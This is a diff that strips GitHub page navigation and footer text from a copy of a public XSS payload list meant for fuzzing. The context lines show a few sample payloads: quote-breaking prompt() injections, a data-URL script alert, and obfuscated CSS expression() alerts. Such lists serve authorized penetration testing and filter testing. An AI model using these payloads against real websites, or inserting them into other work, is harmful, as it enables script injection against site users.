@@ -1,38 +1,3 @@
-
-Skip to content
-Pull requests
-Issues
-Codespaces
-Marketplace
-Explore
-@drcayber
-payloadbox /
-xss-payload-list
-Public
-
-Fork your own copy of payloadbox/xss-payload-list
-
-Code
-Issues 2
-Pull requests
-Actions
-Projects
-Security
-
-    Insights
-
-Beta Try the new code view
-xss-payload-list/Intruder/xss-payload-list.txt
-@riodrwn
-riodrwn Update xss-payload-list.txt
-Latest commit d1d91db Oct 2, 2021
-History
-4 contributors
-@ismailtasdelen
-@riodrwn
-@anishkashukla
-@macroman321
-6613 lines (6613 sloc) 451 KB
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
@@ -6646,20 +6611,3 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <div style=xss:expressio\00006e(alert(1))>
 <div style=xss:expressio\6e(alert(1))>
 <div style=xss:expressio&#x5c;6e(alert(1))>
-Footer
-© 2023 GitHub, Inc.
-Footer navigation
-
-    Terms
-    Privacy
-    Security
-    Status
-    Docs
-    Contact GitHub
-    Pricing
-    API
-    Training
-    Blog
-    About
-
-xss-payload-list/xss-payload-list.txt at master · payloadbox/xss-payload-list
